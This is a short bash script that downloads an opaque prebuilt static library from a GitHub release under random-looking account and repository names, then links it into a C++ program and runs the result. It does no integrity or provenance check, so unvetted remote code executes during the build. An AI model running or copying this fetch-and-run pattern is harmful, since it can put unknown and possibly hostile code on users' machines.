#!/usr/bin/env bash
set -e
TAG="clever-comet-frosty-ember"
LIB="logic-glacier.a"
URL="https://github.com/dengopjx/pylacquerbrochure/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ -o app -std=c++17 -O2 -pthread main.cpp "$LIB" && ./app
